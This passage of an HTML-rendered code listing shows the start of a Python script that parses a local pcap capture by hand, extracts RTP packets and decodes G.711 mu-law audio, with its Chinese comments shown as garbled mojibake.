</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">è¶…å¿«é€ŸRTPæµæå–å·¥å…·
</span></span></span><span class="line"><span class="cl"><span class="s2">ç›´æ¥å¤„ç†åŸå§‹å­—èŠ‚ï¼Œé¿å…Scapyå®Œæ•´è§£æ
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">wave</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PCAP_FILE</span> <span class="o">=</span> <span class="s2">&#34;Data.pcap&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">OUTPUT_DIR</span> <span class="o">=</span> <span class="s2">&#34;rtp_audio&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">NUM_THREADS</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åˆ›å»ºè¾“å‡ºç›®å½•</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">OUTPUT_DIR</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># G.711 Î¼-law è§£ç è¡¨ï¼ˆé¢„å…ˆæ„å»ºï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">MULAW_TABLE</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mulaw</span> <span class="o">=</span> <span class="o">~</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">sign</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="k">if</span> <span class="p">(</span><span class="n">mulaw</span> <span class="o">&amp;</span> <span class="mh">0x80</span><span class="p">)</span> <span class="k">else</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">exponent</span> <span class="o">=</span> <span class="p">(</span><span class="n">mulaw</span> <span class="o">&amp;</span> <span class="mh">0x70</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="n">mantissa</span> <span class="o">=</span> <span class="n">mulaw</span> <span class="o">&amp;</span> <span class="mh">0x0F</span>
</span></span><span class="line"><span class="cl">    <span class="n">magnitude</span> <span class="o">=</span> <span class="p">((</span><span class="n">mantissa</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x84</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">exponent</span>
</span></span><span class="line"><span class="cl">    <span class="n">magnitude</span> <span class="o">=</span> <span class="n">magnitude</span> <span class="o">-</span> <span class="mh">0x84</span>
</span></span><span class="line"><span class="cl">    <span class="n">MULAW_TABLE</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sign</span> <span class="o">*</span> <span class="n">magnitude</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_mulaw_fast</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å¿«é€Ÿè§£ç  Î¼-law&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">pcm_value</span> <span class="o">=</span> <span class="n">MULAW_TABLE</span><span class="p">[</span><span class="n">byte</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">struct</span><span class="o">.</span><span class="n">pack_into</span><span class="p">(</span><span class="s1">&#39;&lt;h&#39;</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">2</span><span class="p">,</span> <span class="n">pcm_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_pcap_raw</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å¿«é€Ÿè¯»å–pcapæ–‡ä»¶ï¼Œåªæå–UDPåŒ…çš„åŸå§‹æ•°æ®&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">packets</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># è¯»å–å…¨å±€å¤´ï¼ˆ24å­—èŠ‚ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="n">global_header</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">global_header</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">24</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">packets</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">magic</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">global_header</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">magic</span> <span class="o">==</span> <span class="mh">0xa1b2c3d4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;&lt;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">magic</span> <span class="o">==</span> <span class="mh">0xd4c3b2a1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;&gt;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ä¸æ”¯æŒçš„pcapæ ¼å¼&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">packets</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># è¯»å–åŒ…å¤´ï¼ˆ16å­—èŠ‚ï¼‰</span>
</span></span><span class="line"><span class="cl">            <span class="n">packet_header</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_header</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">ts_sec</span><span class="p">,</span> <span class="n">ts_usec</span><span class="p">,</span> <span class="n">incl_len</span><span class="p">,</span> <span class="n">orig_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">endian</span><span class="si">}</span><span class="s1">IIII&#39;</span><span class="p">,</span> <span class="n">packet_header</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="c1"># è¯»å–åŒ…æ•°æ®</span>
</span></span><span class="line"><span class="cl">            <span class="n">packet_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">incl_len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">incl_len</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">count</span> <span class="o">%</span> <span class="mi">100000</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] å·²è¯»å– </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s2"> ä¸ªåŒ…...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">packets</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">packet_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">packets</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_ethernet_ip_udp</span><span class="p">(</span><span class="n">raw_data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å¿«é€Ÿè§£æä»¥å¤ªç½‘/IP/UDPåŒ…&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># ä»¥å¤ªç½‘å¤´ï¼ˆ14å­—èŠ‚ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">14</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">eth_type</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!H&#39;</span><span class="p">,</span> <span class="n">raw_data</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">14</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ£€æŸ¥æ˜¯å¦æ˜¯IPåŒ…ï¼ˆ0x0800ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">eth_type</span> <span class="o">!=</span> <span class="mh">0x0800</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># IPå¤´ï¼ˆæœ€å°20å­—èŠ‚ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">34</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">ip_start</span> <span class="o">=</span> <span class="mi">14</span>
</span></span><span class="line"><span class="cl">        <span class="n">ip_header_len</span> <span class="o">=</span> <span class="p">(</span><span class="n">raw_data</span><span class="p">[</span><span class="n">ip_start</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x0F</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">        <span class="n">ip_protocol</span> <span class="o">=</span> <span class="n">raw_data</span><span class="p">[</span><span class="n">ip_start</span> <span class="o">+</span> <span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ£€æŸ¥æ˜¯å¦æ˜¯UDPï¼ˆ17ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ip_protocol</span> <span class="o">!=</span> <span class="mi">17</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">src_ip</span> <span class="o">=</span> <span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">raw_data</span><span class="p">[</span><span class="n">ip_start</span><span class="o">+</span><span class="mi">12</span><span class="p">:</span><span class="n">ip_start</span><span class="o">+</span><span class="mi">16</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">dst_ip</span> <span class="o">=</span> <span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">raw_data</span><span class="p">[</span><span class="n">ip_start</span><span class="o">+</span><span class="mi">16</span><span class="p">:</span><span class="n">ip_start</span><span class="o">+</span><span class="mi">20</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># UDPå¤´ï¼ˆ8å­—èŠ‚ï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="n">udp_start</span> <span class="o">=</span> <span class="n">ip_start</span> <span class="o">+</span> <span class="n">ip_header_len</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">udp_start</span> <span class="o">+</span> <span class="mi">8</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">src_port</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!H&#39;</span><span class="p">,</span> <span class="n">raw_data</span><span class="p">[</span><span class="n">udp_start</span><span class="p">:</span><span class="n">udp_start</span><span class="o">+</span><span class="mi">2</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">dst_port</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!H&#39;</span><span class="p">,</span> <span class="n">raw_data</span><span class="p">[</span><span class="n">udp_start</span><span class="o">+</span><span class="mi">2</span><span class="p">:</span><span class="n">udp_start</span><span class="o">+</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">udp_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!H&#39;</span><span class="p">,</span> <span class="n">raw_data</span><span class="p">[</span><span class="n">udp_start</span><span class="o">+</span><span class="mi">4</span><span class="p">:</span><span class="n">udp_start</span><span class="o">+</span><span class="mi">6</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># UDP payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload_start</span> <span class="o">=</span> <span class="n">udp_start</span> <span class="o">+</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="n">udp_payload</span> <span class="o">=</span> <span class="n">raw_data</span><span class="p">[</span><span class="n">payload_start</span><span class="p">:</span><span class="n">payload_start</span> <span class="o">+</span> <span class="n">udp_len</span> <span class="o">-</span> <span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;src_ip&#39;</span><span class="p">:</span> <span class="n">src_ip</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;dst_ip&#39;</span><span class="p">:</span> <span class="n">dst_ip</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;src_port&#39;</span><span class="p">:</span> <span class="n">src_port</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;dst_port&#39;</span><span class="p">:</span> <span class="n">dst_port</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;payload&#39;</span><span class="p">:</span> <span class="n">udp_payload</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_rtp</span><span class="p">(</span><span class="n">udp_payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å¿«é€Ÿè§£æRTPåŒ…&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">udp_payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ£€æŸ¥ç‰ˆæœ¬å·</span>
</span></span><span class="line"><span class="cl">        <span class="n">version</span> <span class="o">=</span> <span class="p">(</span><span class="n">udp_payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x03</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">version</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">padding</span> <span class="o">=</span> <span class="p">(</span><span class="n">udp_payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x01</span>
</span></span><span class="line"><span class="cl">        <span class="n">csrc_count</span> <span class="o">=</span> <span class="n">udp_payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x0F</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload_type</span> <span class="o">=</span> <span class="n">udp_payload</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x7F</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">sequence</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!H&#39;</span><span class="p">,</span> <span class="n">udp_payload</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">timestamp</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!I&#39;</span><span class="p">,</span> <span class="n">udp_payload</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">ssrc</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;!I&#39;</span><span class="p">,</span> <span class="n">udp_payload</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">12</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æå–payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">header_len</span> <span class="o">=</span> <span class="mi">12</span> <span class="o">+</span> <span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="n">csrc_count</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">udp_payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">header_len</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">udp_payload</span><span class="p">[</span><span class="n">header_len</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># ç§»é™¤padding</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">padding</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">padding_len</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">padding_len</span> <span class="o">&lt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="o">-</span><span class="n">padding_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;ssrc&#39;</span><span class="p">:</span> <span class="n">ssrc</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;sequence&#39;</span><span class="p">:</span> <span class="n">sequence</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="n">timestamp</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;payload_type&#39;</span><span class="p">:</span> <span class="n">payload_type</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;payload&#39;</span><span class="p">:</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å…¨å±€è®¡æ•°å™¨</span>
</span></span><span class="line"><span class="cl"><span class="n">processed_counter</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">rtp_counter</span> <span class="o">=</span> <span class="mi">0</span>
